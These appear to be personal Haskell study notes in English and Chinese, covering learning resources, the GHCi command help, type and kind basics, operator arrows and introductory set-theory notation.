
===================================================
/. 🚀 ./Documentation
===================================================

`名安装 Haskell 在线编译器 <https://haskell.godbolt.org/>`__


.. code-block::

   #!/usr/bin/env bash
   url=https://learnyouahaskell.com/chapters
   url=https://www.haskell.org/documentation/
   pandoc -r html "$url" -t rst | subl -

   # https://gitlab.haskell.org/ghc/ghc/-/tree/master/docs/users_guide
   git clone --recurse-submodules git@gitlab.haskell.org:ghc/ghc.git

   exit 


.. rubric:: Documentation
  :name: documentation

This page lists various resources to help you with 
Haskell. Resources marked with [$] require payment.

If you are new to Haskell and are not sure where to start from, we recommend
`CIS194 <https://www.seas.upenn.edu/~cis194/spring13/lectures.html>`__.
CIS194 is the introductory Haskell course of the
University of Pennsylvania; it is free, thorough,
practical and will guide you from the basics to advanced
features of the language.

.. rubric:: Introductory Books for Learning Haskell
  :name: introductory-books-for-learning-haskell

-  `Learn You a Haskell for Great Good! <http://learnyouahaskell.com/>`__
-  `Real World Haskell <http://book.realworldhaskell.org/>`__
-  `Learn Haskell by building a blog generator <https://learn-haskell.blog>`__
-  [$] `Haskell from the Very Beginning <https://www.haskellfromtheverybeginning.com/>`__
-  [$] `Haskell Programming from first principles <http://haskellbook.com>`__
-  [$] `Thinking Functionally with Haskell <http://www.cambridge.org/us/academic/subjects/computer-science/programming-languages-and-applied-logic/thinking-functionally-haskell>`__
-  [$] `Programming in Haskell <http://www.cs.nott.ac.uk/~pszgmh/pih.html>`__
-  [$] `Haskell: The Craft of Functional Programming <http://www.haskellcraft.com/craft3e/Home.html>`__
-  [$] `The Haskell School of Music <http://euterpea.com/haskell-school-of-music/>`__
-  [$] `Get Programming with Haskell <https://www.manning.com/books/get-programming-with-haskell>`__
-  [$] `Effective Haskell <https://www.pragprog.com/titles/rshaskell/effective-haskell/>`__
-  [$] `Haskell: Uma introdu莽茫o 脿 programa莽茫o funcional (PT-BR) <https://www.casadocodigo.com.br/products/livro-haskell>`__
-  [$] `Learn Physics with Functional Programming: A Hands-on Guide to Exploring Physics with Haskell <https://lpfp.io/>`__

.. rubric:: Intermediate Haskell Books
  :name: intermediate-haskell-books

-  `Developing Web Applications with Haskell and Yesod <http://www.yesodweb.com/book>`__
-  `Parallel and Concurrent Programming in Haskell <https://simonmar.github.io/pages/pcph.html>`__
-  [$] `Functional Design and Architecture <https://www.manning.com/books/functional-design-and-architecture>`__
-  [$] `Haskell in Depth <https://www.manning.com/books/haskell-in-depth>`__
-  [$] `Practical Haskell <https://www.apress.com/gp/book/9781484244791>`__
-  [$] `Production Haskell <https://leanpub.com/production-haskell>`__

.. rubric:: Courses
  :name: courses

Course material created by instructors 

-  `University of Pennsylvania's CIS 194 <https://www.seas.upenn.edu/~cis1940/spring13/>`__
-  `Data61 Functional Programming Course <https://github.com/data61/fp-course>`__
-  `Stanford's cs240h <http://www.scs.stanford.edu/14sp-cs240h/>`__
-  `Hendrix's CSCI 360 <http://ozark.hendrix.edu/~yorgey/360/f16/>`__
-  `University of Helsinki's Haskell MOOC <https://haskell.mooc.fi/>`__
-  `University of Nottingham's introductory Haskell course <http://www.cs.nott.ac.uk/~pszgmh/pgp.html>`__
-  `University of Nottingham's advanced Haskell course <http://www.cs.nott.ac.uk/~pszgmh/afp.html>`__

.. rubric:: Tutorials
  :name: tutorials

Short, dense, classic ways to hit the ground running 

-  `A Gentle Introduction to Haskell <https://www.haskell.org/tutorial/>`__
-  `Happy Learn Haskell Tutorial <https://www.happylearnhaskelltutorial.com/>`__
-  `Yet Another Haskell Tutorial <http://en.wikibooks.org/wiki/Haskell/YAHT/Preamble>`__
-  `Write Yourself a Scheme in 48 Hours <http://en.wikibooks.org/wiki/Write_Yourself_a_Scheme_in_48_Hours>`__
-  `Write Yourself a Scheme 2.0 <https://wespiser.com/writings/wyas/home.html>`__
-  `Learning Haskell <http://learn.hfm.io>`__
-  `Haskell Beginners Course 2022 <https://github.com/haskell-beginners-2022/course-plan>`__

.. rubric:: Online Resources
  :name: online-resources

Curated resources put together by Haskellers: 

-  `The Haskell Wiki <http://wiki.haskell.org>`__
-  `The Haskell Wikibook <http://en.wikibooks.org/wiki/Haskell>`__
-  `FP Complete's School of Haskell <https://www.schoolofhaskell.com/>`__
-  `Stephen Diehl's What I Wish I Knew When Learning Haskell <https://web.archive.org/web/20220513191346/http://dev.stephendiehl.com/hask/>`__
-  `Chris Allen's List of Learning Haskell Resources <https://github.com/bitemyapp/learnhaskell>`__
-  `Bob Ippolito's Getting Started with Haskell <http://bob.ippoli.to/archives/2013/01/11/getting-started-with-haskell/>`__
-  `Albert Y.C. Lai's Haskell Notes and Examples <http://www.vex.net/~trebla/haskell/index.xhtml>`__
-  `Learning Haskell Resources on the Haskell Wiki <https://wiki.haskell.org/Learning_Haskell>`__

.. rubric:: Manuals and Guides
  :name: manuals-and-guides

Manuals and guides that cover common Haskell tooling: 

-  `GHC User's Guide <http://www.haskell.org/ghc/docs/latest/html/users_guide/>`__
-  `Cabal Homepage And Quick Links <https://www.haskell.org/cabal/>`__
-  `Cabal User Guide <http://www.haskell.org/cabal/users-guide/>`__
-  `Stack User Guide <https://docs.haskellstack.org/>`__ 
-  `Haddock User Guide <https://haskell-haddock.readthedocs.io/>`__
-  `Haskeleton: A Haskell Project Skeleton <http://taylor.fausak.me/2014/03/04/haskeleton-a-haskell-project-skeleton/>`__
-  `How to Write a Haskell Program <https://wiki.haskell.org/How_to_write_a_Haskell_program>`__

.. rubric:: Package and Dependency Management
  :name: package-and-dependency-management

The Cabal guide is a good start but there's a lot to learn:

-  `Stephen Diehl's Cabal Quickstart <https://web.archive.org/web/20220513191346/http://dev.stephendiehl.com/hask/#cabal>`__
-  `The Storage and Interpretation of Cabal Packages <http://www.vex.net/~trebla/haskell/sicp.xhtml>`__
-  `The Cabal of Cabal <http://www.vex.net/~trebla/haskell/cabal-cabal.xhtml>`__

.. rubric:: Library Documentation
  :name: library-documentation

Documentation for Haskell libraries is typically 
available on Hackage. We also have specialized tools for
searching across it, not only by name, but by type.

-  `Hoogle API Search <http://www.haskell.org/hoogle/>`__
-  `Hackage <http://hackage.haskell.org/>`__
-  `Stackage (with API Search) <https://www.stackage.org>`__
-  `The Typeclassopedia <https://wiki.haskell.org/Typeclassopedia>`__
-  `Haddocks for Libraries included with GHC <https://downloads.haskell.org/~ghc/latest/docs/html/libraries/index.html>`__

.. rubric:: Language Report
  :name: language-report

The Haskell 2010 language report is available online as 
`HTML <https://haskell.org/onlinereport/haskell2010/>`__
and as
`PDF <https://haskell.org/definition/haskell2010.pdf>`__.
The `source is available on GitHub <https://github.com/haskell/haskell-report>`__.
The differences between GHC and the report can be found
`in the GHC User's Guide <http://www.haskell.org/ghc/docs/latest/html/users_guide/bugs.html#haskell-standards-vs-glasgow-haskell-language-non-compliance>`__.




================================
/GHCI - command-line interpreter
================================

.. container::

   Usage:

       ghci [command-line-options-and-input-files]

   The kinds of input files that can be given on the command-line
   include:

     - Haskell source files (.hs or .lhs suffix)
     - Object files (.o suffix, or .obj on Windows)
     - Dynamic libraries (.so suffix, or .dll on Windows)

   In addition, ghci accepts most of the command-line options that plain
   GHC does.  Some of the options that are commonly used are:

       -i<dir>         Search for imported modules in the directory <dir>.

       -H32m       Increase GHC's default heap size to 32m

       -cpp            Enable CPP processing of source files

   Full details can be found in the User's Guide, an online copy of which
   can be found here:

       http://www.haskell.org/ghc/docs/latest/html/users_guide/

   If you *really* want to see every option, then you can pass
   '--show-options' to ghci.

.. container::

   ghci> :?
    Commands available from the prompt:

      <statement>                 evaluate/run <statement>
      :                           repeat last command
      :{\n ..lines.. \n:}\n       multiline command
      :add [*]<module> ...        add module(s) to the current target set
      :browse[!] [[*]<mod>]       display the names defined by module <mod>
                                  (!: more details; *: all top-level names)
      :cd <dir>                   change directory to <dir>
      :cmd <expr>                 run the commands returned by <expr>::IO String
      :complete <dom> [<rng>] <s> list completions for partial input string
      :ctags[!] [<file>]          create tags file <file> for Vi (default: "tags")
                                  (!: use regex instead of line number)
      :def[!] <cmd> <expr>        define command :<cmd> (later defined command has
                                  precedence, ::<cmd> is always a builtin command)
                                  (!: redefine an existing command name)
      :doc <name>                 display docs for the given name (experimental)
      :edit <file>                edit file
      :edit                       edit last module
      :etags [<file>]             create tags file <file> for Emacs (default: "TAGS")
      :help, :?                   display this list of commands
      :info[!] [<name> ...]       display information about the given names
                                  (!: do not filter instances)
      :instances <type>           display the class instances available for <type>
      :issafe [<mod>]             display safe haskell information of module <mod>
      :kind[!] <type>             show the kind of <type>
                                  (!: also print the normalised type)
      :load[!] [*]<module> ...    load module(s) and their dependents
                                  (!: defer type errors)
      :main [<arguments> ...]     run the main function with the given arguments
      :module [+/-] [*]<mod> ...  set the context for expression evaluation
      :quit                       exit GHCi
      :reload[!]                  reload the current module set
                                  (!: defer type errors)
      :run function [<arguments> ...] run the function with the given arguments
      :script <file>              run the script <file>
      :type <expr>                show the type of <expr>
      :type +d <expr>             show the type of <expr>, defaulting type variables
      :unadd <module> ...         remove module(s) from the current target set
      :undef <cmd>                undefine user-defined command :<cmd>
      ::<cmd>                     run the builtin command
      :!<command>                 run the shell command <command>

    -- Commands for debugging:

      :abandon                    at a breakpoint, abandon current computation
      :back [<n>]                 go back in the history N steps (after :trace)
      :break [<mod>] <l> [<col>]  set a breakpoint at the specified location
      :break <name>               set a breakpoint on the specified function
      :continue [<count>]         resume after a breakpoint [and set break ignore count]
      :delete <number> ...        delete the specified breakpoints
      :delete *                   delete all breakpoints
      :disable <number> ...       disable the specified breakpoints
      :disable *                  disable all breakpoints
      :enable <number> ...        enable the specified breakpoints
      :enable *                   enable all breakpoints
      :force <expr>               print <expr>, forcing unevaluated parts
      :forward [<n>]              go forward in the history N step s(after :back)
      :history [<n>]              after :trace, show the execution history
      :ignore <breaknum> <count>  for break <breaknum> set break ignore <count>
      :list                       show the source code around current breakpoint
      :list <identifier>          show the source code for <identifier>
      :list [<module>] <line>     show the source code around line number <line>
      :print [<name> ...]         show a value without forcing its computation
      :sprint [<name> ...]        simplified version of :print
      :step                       single-step after stopping at a breakpoint
      :step <expr>                single-step into <expr>
      :steplocal                  single-step within the current top-level binding
      :stepmodule                 single-step restricted to the current module
      :trace                      trace after stopping at a breakpoint
      :trace <expr>               evaluate <expr> with tracing on (see :history)

    -- Commands for changing settings:

      :set <option> ...           set options
      :seti <option> ...          set options for interactive evaluation only
      :set local-config { source | ignore }
                                  set whether to source .ghci in current dir
                                  (loading untrusted config is a security issue)
      :set args <arg> ...         set the arguments returned by System.Environment.getArgs
      :set prog <progname>        set the value returned by System.Environment.getProgName
      :set prompt <prompt>        set the prompt used in GHCi
      :set prompt-cont <prompt>   set the continuation prompt used in GHCi
      :set prompt-function <expr> set the function to handle the prompt
      :set prompt-cont-function <expr>
                                  set the function to handle the continuation prompt
      :set editor <cmd>           set the command used for :edit
      :set stop [<n>] <cmd>       set the command to run when a breakpoint is hit
      :unset <option> ...         unset options

     Options for ':set' and ':unset':

       +m            allow multiline commands
       +r            revert top-level expressions after each evaluation
       +s            print timing/memory stats after each evaluation
       +t            print type after evaluation
       +c            collect type/location info after loading modules
       -<flags>      most GHC command line flags can also be set here
                            (eg. -v2, -XFlexibleInstances, etc.)
                       for GHCi-specific flags, see User's Guide,
                       Flag reference, Interactive-mode options

    -- Commands for displaying information:

      :show bindings              show the current bindings made at the prompt
      :show breaks                show the active breakpoints
      :show context               show the breakpoint context
      :show imports               show the current imports
      :show linker                show current linker state
      :show modules               show the currently loaded modules
      :show packages              show the currently active package flags
      :show paths                 show the currently active search paths
      :show language              show the currently active language flags
      :show targets               show the current set of targets
      :show <setting>             show value of <setting>, which is one of
                                     [args, prog, editor, stop]
      :showi language             show language flags for interactive evaluation

    The User's Guide has more information. An online copy can be found here:

      https://downloads.haskell.org/~ghc/latest/docs/html/users_guide/ghci.html


=======================================
/Category Theory：敲开 Haskell 箭头的大门
=======================================

.. container::

   Haskell Brooks Curry（哈斯凯尔·科里，1900-1982），美国数学家、逻辑学家，数理逻辑和计算机
   科学历史上里程碑式的存在，其名声不如阿兰·图灵那么响亮，其影响不如库尔特·哥德尔那么广泛，但是，
   Curry 对的人类历史的贡献完全可以和前者比肩。如果说图灵机是现代计算机程序设计语言的基本模型，
   那么可计算函数就是和图灵机等价的另一种模型。当前流行的丘奇的 λ-演算 模型，其动机就是函数式
   编程模式的兴起。而柯里的组合逻辑，作为 λ-演算 的等价，在某些方面比后者更为洗练、优雅。当今，
   有三种编程语言以他的名字命名: Haskell、 Brooks 和 Curry。为了纪念他，将一个多参数函数
   转换为单参数函数序列的技术称为柯里化（Currying)。

   Abstract Computing Machines: A Lambda Calculus Perspective (by Werner Klugew)
   一书总结了 1930-1940 年代在可计算性（computability）研究方面的几种抽象计算机模型：

      1. 阿兰·图灵的图灵机模型（Turing machine）
      2. 丘奇的λ-演算模型（λ-calculus）
      3. 克里尼的递归函数模型（Kleene’s recursive functions）
      4. Schönfinkel 和柯里的组合逻辑模型（Schönfinkel’s and Curry’s combinators）
      5. 波斯特的产生式系统（Emil Post's production systems）（乔姆斯基生成语法形式化部分的原型）
      6. 马尔科夫算法（Markov algorithms）（一种类似前者的字串重写生成式系统）

   Haskell 涉及大量数学术语，对于没有数学背景的读者，可能存在读不懂文档的问题。并且，像笔者这样
   非数学专业、离开大学就冰封数学的水平，直接阅读“态射”这一概念都有困难。态射是范畴论的核心概念，
   也是 Haskell 语言的基础结构：

      态射（morphism）是在数学中是指两个数学结构之间保持结构的一种映射。

   这是很简单的一个定义，每个汉字或单词你都认识，但是组合到一起你就是不懂在说什么。无它，抽象废话尔！
   一个事物之所以会形成抽象的感觉，根本在于你缺少相关的前置知识，俗称基础不牢。通常这种问题首先解决
   方法是向“历史老师”请教。这个历史老师打了双引，因为它不是一个人，而是一堆人在特定领域探索的道路。
   这里的历史老师显然就是数学的历史。人类每一个知识点可能是前人经年累月的研究才达成的，而你要几分钟
   或者几小时、几天的时间掌握它，显然不是一件轻松的事。数学本身就是抽象的科学，通过学习前人在数学
   进化道路上形成的抽象观念，显得非常重要，特别对还没有形成强大数学抽象能力的人。

   以下是新手建议，显然阅读这些教材是有前置基础要求的，毕竟是通用教材，并非基于个人水平定制。
   因此，整理出一份属于自己的笔记就是为自己定制的“教材”：

   *  了解数学的发展史，学习抽象代数。有这么几个好处：
      一、给范畴论提供许多例子；
      二、锻炼书写证明的能力；
      三、可重新理解许多常用工具，如线性代数。一般来说，学一点基础的群论、环论（可约性）、模就够了。

   *  学习代数拓扑。代数拓扑是范畴论的发源地。
      人们发现，空间，比如说球面或者甜甜圈表面上的环和群存在关联。
      举个例子，绕着一个圆环的首尾相连的路径，可以根据绕圆环的圈数进行分类，后者与整数集同构。
      这就是一个由拓扑空间范畴到群范畴上的函子。这些函子可比 Maybe 有趣的多。

   *  教材及阅读材料：

      Algebraic Topology by Allen Hatcher “一本写的像数学书的（多图）杂志。”
      https://pi.math.cornell.edu/~hatcher/AT/AT+.pdf

      代数拓扑 南开大学 王向军
      https://www.bilibili.com/video/BV1aJ411J7ji/

      Contemporary Abstract Algebra NINTH EDITION Joseph A. Gallian

      最后，不要学同调代数！不要学同调代数！不要学 Homology！

      `在数学的海洋中飘荡 - MIT计算机视觉专业林达华 <https://dahuasky.wordpress.com/2009/01/22/在数学的海洋中飘荡/>`__

      `Branches of Mathematics: Arithmetic, Algebra, Geometry, Calculus, Trigonometry, Topology, Probability and Statistics <https://leverageedu.com/blog/branches-of-mathematics/>`__

      `Type Theory <https://plato.stanford.edu/entries/type-theory/>`__

      `Constructive Type Theory <https://plato.stanford.edu/entries/type-theory-intuitionistic>`__

      `Intuitionistic Type Theory <https://plato.stanford.edu/entries/type-theory-intuitionistic>`__

      `A Sensible Introduction to Category Theory <https://www.bilibili.com/list/1801761269>`__

      `Category Theory <https://plato.stanford.edu/entries/category-theory>`__

      `Category Theory for Computing Science by Michael Barr Charles Wells (Revised edition, 1999) <https://www.math.mcgill.ca/barr/papers/ctcs.pdf>`__

      `Type Theory and Functional Programming - Simon Thompson <https://www.cs.kent.ac.uk/people/staff/sjt/TTFP/ttfp.pdf>`__

      `Introduction to Logic - Harry J. Gensler <https://pan.baidu.com/s/1g-HiWTtFkzmJGJCu_wcYBQ?pwd=1kq0>`__

      `Categories Great and Small by Bartosz Milewski <https://bartoszmilewski.com/2014/12/05/categories-great-and-small/>`__

   传统程序语言与函数式语言的区别在于指令式（Imperative）与声明式（declarative）：

   *  “Conventional” program structure: Imperative
      ○ Java, C, Python…
      ○ Describe “how” program does something
      ○ program is series of steps (control flow)
      ■ For loops, if/then...
      ● Alternative: Declarative

   *  Functional languages typically declarative
      ■ Haskell
      ○ Describe logic but don’t describe control flow
      ■ Functions, recursion...

   命令式语言基本思维是：这个代码/函数要做什么？声明式语言的基本思维是：这个代码/函数是什么？

   Stanford's cs240h 公开课程的课件中 Lecture 1 Basics 很全面地介绍了 Haskell 纯函数式
   编程与传统命令式语言的差别。讲课教授包括 Readl World Haskell 一书作者。

   Haskell 是纯函数 (Pure Function) 语言，纯函数这个概念是指：相同的输入，纯函数会返回相同值。
   这种性质称为无副作用（side effects free）。


   GHCI_ 中交互式解释器，“i” 即代表 “Interactive”，它可以执行以下功能；

   1. interactively evaluate Haskell expressions
   2. interpret Haskell programs
   3. load GHC-compiled modules.

   GHCI_ 交互解释器中敲入多行代码时，``:{`` 和 ``:}`` 符号包括多选代码。
   也可以使用 ``:set +m`` 配置打开多行输入模式。使用 ``:?`` 查看相关命令帮助信息。
   Windows 系统 CTRL-D 输入的是 EOT，CTRL-Z 才和 Linux 系统 CTRL-D 一样输入 EOF。

   .. code-block:: haskell

      ghci> :{
         let  {  y   = a*b
              ; f x = (x+y)/y
              }
         in f c + f d
      :}

   使用 ``:load`` 命令加载源代码模块，比如 ``:load Main`` 加载 Main.hs 或者 Main.lhs。
   运行 GHCI_ 命令时，可以使用 -i 选项添加模块所在的目录。可以使用 ``cabal repl`` 进入
   交互解释器，它会提供额外的配置，以使用依赖库。

   通过 Cabal 或者 Stack 工具管理的模块通常是动态共享库（shared libraries）。
   GHC 编译器在编译代码文件时生成目标文件（.o），与 C 的目标文件完全相同。
   还有一个接口文件（.hi），相当于 C 语言的头文件 (.h)。接口文件包含有关 .o 文件的信息，
   比如函数符号等等。编译其他依赖这个模块的代码时，GHC 就可以根据这些信息进行链接。

   `Windows DLL`__ 目前不支持。``ghc -c -dynamic M.hs`` 这样的命令编译生成共享库会报错：

      Perhaps you haven't installed the "dyn" libraries for package ‘base-4.17.2.1

   .. _GHCI: https://downloads.haskell.org/ghc/latest/docs/users_guide/ghci.html
   .. _5.3 Import Declarations: https://www.haskell.org/onlinereport/haskell2010/haskellch5.html#x11-1010005.3
   .. _Windows DLL: https://gitlab.haskell.org/ghc/ghc/-/wikis/windows-dynamic-linking

   按照 Haskell Language Report - Lexical Structure 描述，通过代码布局（Layout），
   即代码的格式对齐，可以省略花括号和分号。

   The Haskell 2010 Language 文档所述，符号命名空间分为 6 类，有两条约束条件：

   1. those for variables and constructors denote values; 
   2. those for type variables, type constructors,
   3. and type classes refer to entities related to the type system; 
   4. and module names refer to modules. 

   这 6 类命名形式可以使用下表呈现：

      ====== ===== =================== ========================
      varid                                (variables)     
      conid                                (constructors)  
      tyvar  →     varid                   (type variables)
      tycon  →     conid                   (type constructors)
      tycls  →     conid                   (type classes)
      modid  →     {conid .} conid         (modules)
      ====== ===== =================== ========================

   命名空间的两条约束条件是：

   #. 变量名或类型变量标识符号使用小写字母或下划线开头，其它四类名字使用大写字母开头；
   #. 不能在同一个作用域中使用一个标识符作为类型构造器或类名称；

   Haskell 还支持 Unicode 符号，所以，Haskell 中的变量可以使用 var‘ 这样的名称。
   为了避免命名冲突，应该禁止使用以下 Haskell 保留的运算符号：
   ::

      :!#$%&*+./<=>?@\^| 

   Haskell 中的变量是不可变的（Immutable），就像命令式语言中的常量，使用绑定（binding）来
   给变量赋值，因此 = 号在 Haskell 中意味着声明一个变量的绑定，而非赋值。变量一旦绑定之后，
   就不能再绑定其它值。Haskell 是编程语言又是数学语言，其类型系统也为数学服务。

   命令式语言，一般上有一套内置的类型，一般中讨论变量或常量的类型。Haskell 语言中，
   一切表达式都具有它本身的类型，即便是列表，它包含的元素不同，就具有不同的类型。


   类型理论最早由罗素在其朴素集合论（Naive Set Theory）发现的悖论中演化而来。
   构造性类型理论（Constructive Type Theory）又称为直觉类型理论，于 1970s 年代由 
   Per Martin-Löf 发表。

   简单地说，构造主义的核心就是 “要证明一个东西存在，必须把它构造出来”。
   在计算机科学编程语言理论中，类型论提供了设计分析和研究类型系统的形式基础。

   Haskell 基于直觉类型系统，GHCI_ 提供了 ``:kind`` 和 ``:type`` 两个命令用于获取类型信息。
   `Haskell's kind system - a primer <https://diogocastro.com/blog/2018/10/17/haskells-kind-system-a-primer/>`__

例如 "hello" 和 "world" 都属于 String 类型，True 和 False 都属于 Bool 类型。相似地，String 类型和 Bool 类型都属于 *（读作 "star"）kind。

表达式 (values/terms) 都有类型 (types)，types 也有自己对应的 kinds。



   Haskell 语言的 ``data`` 关键字对应构造器（Constructor），它可以有两种含义：

   *  `Type constructor <https://wiki.haskell.org/Constructor>`__
      ::

         -- An example of a nullary type constructor Bool with 
         -- two nullary data constructors True and False
         data Bool = True | False

         --  An example of a unary type constructor: Tree
         data Tree a = Tip | Node a (Tree a) (Tree a)

   *  Data constructor (or value constructor)
      -  Data constructors are not types
      -  Data constructors as first class values
      ::

         data Bool = True | False
         data Tree a = Tip | Node a (Tree a) (Tree a)

   即构造新的类型，或者构造新的值（数据值）。Haskell 语言的类型系统与传统的命令式语言有很大的不同。
   Haskell 编程模型中，构造

   以下是来自 `Typeclassopedia <https://wiki.haskell.org/Typeclassopedia>`__
   一文中的关于 Haskell 类型关系的配图：

   .. figure:: ./pictures/haskell_typeclasses.svg

      关系图使用 Graphviz 脚本定义，可以使用 dot -Tsvg 命令转换为 SVG 图形格式。

      digraph {
        node [shape=box];
        Functor -> Applicative -> Monad;
        Apply -> Applicative;
        Semigroup -> Apply [constraint=false; style=dotted; arrowhead=none];
        Apply [color=grey];
        Applicative -> Alternative;
        Monad -> MonadPlus;
        Monad -> MonadFix;
        Semigroup -> Monoid;
        Monoid -> Applicative [constraint=false; style=dotted; arrowhead=none];
        Monoid -> Category [constraint=false; style=dotted; arrowhead=none];
        Monoid -> Alternative [style=dotted; arrowhead=none];
        Monoid -> MonadPlus [style=dotted; arrowhead=none];
        Category -> Arrow -> ArrowChoice;
        Arrow -> ArrowApply;
        Arrow -> ArrowLoop;
        Arrow -> ArrowZero -> ArrowPlus;
        {rank = same; Arrow; ArrowZero; ArrowPlus}
        Monoid -> ArrowPlus [style=dotted; arrowhead=none];
        Monad -> ArrowApply [style=bold, arrowhead=none];
        Monoid -> Foldable [style=dotted; arrowhead=none];
        Monoid -> Monad [style=dotted; arrowhead=none];
        Applicative -> Traversable [style=dotted; arrowhead=none];
        Foldable -> Traversable;
        Functor -> Traversable;
        Comonad [color=grey];
        Functor -> Comonad;
      }

   令人困惑的“箭头”们： => -> <- <= 等组合符号字面上隐含有箭头含义，此外还有 =<< & >=> & <=<。
   建议使用 Fira Code 字体，这些组合符号会显示为对应的箭头符号。 以下是 GHC 编译器文档所支持的
   Unicode 箭头符号与 ASCII 组合符号的对照表：
   https://downloads.haskell.org/ghc/latest/docs/users_guide/exts/unicode_syntax.html

   =======  =======  ==========  ==============================
   ASCII    Unicode  Code point  Name
   =======  =======  ==========  ==============================
   ::       ∷        0x2237       PROPORTION
   =>       ⇒        0x21D2       RIGHTWARDS DOUBLE ARROW
   ->       →        0x2192       RIGHTWARDS ARROW
   <-       ←        0x2190       LEFTWARDS ARROW
   >-       ⤚        0x291a       RIGHTWARDS ARROW-TAIL
   -<       ⤙        0x2919       LEFTWARDS ARROW-TAIL
   >>-      ⤜        0x291C       RIGHTWARDS DOUBLE ARROW-TAIL
   -<<      ⤛        0x291B       LEFTWARDS DOUBLE ARROW-TAIL
   *        ★        0x2605       BLACK STAR
   forall   ∀        0x2200       FOR ALL
   (|       ⦇        0x2987       Z NOTATION LEFT IMAGE BRACKET
   |)       ⦈        0x2988       Z NOTATION RIGHT IMAGE BRACKET
   [|       ⟦        0x27E6       MATHEMATICAL LEFT WHITE SQUARE BRACKET
   |]       ⟧        0x27E7       MATHEMATICAL RIGHT WHITE SQUARE BRACKET
   %1->     ⊸        0x22B8       MULTIMAP
   =======  =======  ==========  ==============================

   Haskell 的函数定义中使用了其中前两个：::

      <functionName> :: <paramType> -> ... -> <returnType>

      -- all :: Foldable t => (a -> Bool) -> t a -> Bool
      --                      ^~~~~~~~~~^: 函数作参数
      -- odd :: Integral a => a -> Bool
      -- res2 = all odd [1,2,3,4] -- False

      -- max :: Ord a => a - > a - > a

   -  :: 之后定义函数的参数类型，每个参数都必须定义类型；
   -  多个参数类型用 -> 顺序链接，-> 默认为右结合，这个符号可以当作 -> (to) 符号看待；
   -  函数：当函数作为参数传入时，该函数参数类型声明格式不变，但整体用小括号 () 包围；
   -  返回值类型：最后一个类型用于定义函数返回值的类型；

   -  => 表示逻辑推导。
   -  -> 表示变量之间的连接关系。
   -  <- 就是把此符号右边的计算语境 bind 到左边的变量上。
   -  <= 其实是比较运算符号。
   -  >>= 等同 Rust 语言的 and_then 从句，Haskell 还可以使用 do 语法糖来表达此符号。

   Haskell 的函数严格意义上都是单参数函数，通过柯里化实现多参数函数。
   使用 -> (to) 而不用其他符号（如逗号）分隔的原因也是柯里化。

   比如 max 函数写成 a -> a -> a 而不是 a a -> a，在数学上，curry 的意思是：
   所有函数都能定义为只有一个参数。可以把 max 函数的类型当做 a a -> a 来理解，
   也就是输入两个参数得到一个结果，但这不是 curry。curry 化的 max 类型应该是：
   a -> (a -> a)，只有一个参数，结果是一个函数，这个函数也是一个参数一个结果。
   参数开头的 Ord a 约束了参数 a 的类型是 Ord typeclass，这个类型表示有序的数字，
   包括整数或浮点数。如果没有这个类型定义，a 可以是任何类型。

   Haskell 的函数和数学的函数定义有高度的一致性：函数即映射。Haskell 中定义函数，
   可以为不同的映射模式（参数差异）定义函数体。比如，以下定义 sayMe 函数包含了 6
   个函数体，映射不同的参数值：

      .. code:: haskell:

         sayMe :: (Integral a) => a -> String
         sayMe 1 = "One!"
         sayMe 2 = "Two!"
         sayMe 3 = "Three!"
         sayMe 4 = "Four!"
         sayMe 5 = "Five!"
         sayMe x = "Not between 1 and 5"

   参数 a 定义为整形（Integral），返回值是一个字符串，sayMe 函数就是它们之间关系的映射。

   函数的本质是一种映射关系，与集合 Sets 相关。通俗地讲，集合就是一堆确定的元素/物体。比如，
   桌面上有两个不同颜色的苹果，如果将“桌面上的苹果”看作一个集合，那么这个集集合的元素就
   两个不同颜色的平果。那么用数学符号表示为：::

      ℂ = { 红苹果, 青苹果 }

   集合，简称集，是数学集合论分支中的一个基本抽象概念，也是集合论的主要研究对象，使用双线字母表示。
   数学中使用 set（集合）与 collection（集族）表示单个集合与多个集合的结构，使用大写字母
   C（Collection）表示集合或集族（其元素为集合），使用小写字母表示元素。计算机领域并不严格区分
   集合和集族两者的差别。

   集合论的基本理论创立于 19 世纪，朴素集合论（Intuitive/Navie Sets Theory）定义：
   集合就是“确定的一堆东西”，“东西”即集合中的元素（Elements）。现代一般将集合定义为：
   由一个或多个确定的元素所构成的整体。

   集合有三个基本性质：

      *  ``确定性``：任给一个元素，它必属于或者必不属于该集合，二者必居其一。
      *  ``互异性``：一个集合中，不存在相同的元素。可以使用多重集，其中的元素允许出现多次。
      *  ``无序性``：一个集合中，每个元素的地位对等且无序。

   集合有三种基本表示形式：

      *  ``列举法``：在花括号 { } 内一一列举集合的所有元素，比如 {1,2,3...}。
      *  ``描述法``：在花括号 { } 内将集合元素的性质描述出来，比如 {x | x > 0}。
      *  ``图示法``：使用文氏图（Venn diagram），用闭合曲线围成的图形表示一个集合，

   集合中使用 | 符号表示“如此”“这样”，用于描述集合的元素。

   以下是一些标准数学集合记号（Standard Notations）：

      - ∅ 空集，没有任何元素的集合。
      - 𝕌 通用集，Universal Set，所有可能值的集合。
      - ℕ :sub:`0`  = { 0,1,2,3,4, ... }
      - ℕ :sub:`1` = { 1,2,3,4,5, ... }
      - ℤ  = {...- 3, -2, -1,0,1,2,3, ...}
      - ℚ  = { x | x = un / b , un , b ∈ ℤ :sub:`y` b ≠ 0 }
      - ℝ  = { x | -∞ < x < ∞ }
      - ℂ  = { z | z = a + bi , -∞ < a <∞, -∞ < b < ∞ }

   以下是一些基本的集合运算，注意 ⊂ ⊃ 符号存在误用，可能产生歧义，有人用 A ⊂ B 表示 
   A 是 B 的真子集，有人则以之表示 A 是 B 的子集。为了避免歧义，使用严格符号表示不相等，
   例如 ⫋ ⊊ 。 用 A ⊊ B 或者 A ⊆ B 分别表示 「A是B的真子集，A是B的子集」：

      -  A ⋂ B    交集（intersection），由那些属于 A 又属于 B 的元素构成的集合。
      -  A ⋃ B    并集（union），由 A 和 B 集合所有元素构成的集合。
      -  A ⊆ B    子集（subset of），A 是 B 的子集。集合 B 包含集合 A。例如： {1,2} ⊆ {1,2}
      -  A ⊂ B    严格子集、真子集（proper subset）。例如： {9,1} ⊂ {9,1,11}
      -  A ⊄ B    非子集，A 不是 B 的子集。例如： {9,66} ⊄ {9,14,28}
      -  A ⊇ B    超集（superset of），A 是 B 的超集。集合 A 包含集合 B。例如： {9,1,11} ⊇ {9,1,11}
      -  A ⊃ B    严格超集（Strictly superset），例如： {9,14,28} ⊃ {9,14}
      -  A ⊅ B    非超集。例如： {9,14,28} ⊅ {9,66}。

      -  A △ B 或者 A ⊕ B  表示对称差（symmetric difference），(A-B) ⋃ (B-A)。
